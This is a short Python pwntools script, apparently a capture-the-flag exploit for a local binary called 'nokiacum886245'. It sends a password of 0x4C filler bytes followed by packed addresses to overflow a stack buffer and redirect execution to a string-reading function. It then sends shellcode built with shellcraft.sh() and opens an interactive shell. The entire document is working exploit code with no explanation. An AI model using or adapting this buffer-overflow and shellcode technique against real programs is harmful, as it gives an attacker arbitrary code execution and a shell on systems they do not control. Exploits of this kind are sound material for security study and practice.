from pwn import *
p = process("nokiacum886245")
s1 = 0x0806FE6A
get_string = 0x0804862D

p.recvuntil("Username: ")
raw_input('w')
p.sendline("AAAA")
p.recvuntil("Password: ")
p.sendline("A"*0x4C+p32(get_string)+p32(s1)+p32(s1))
p.sendline(asm(shellcraft.sh()))
p.interactive()


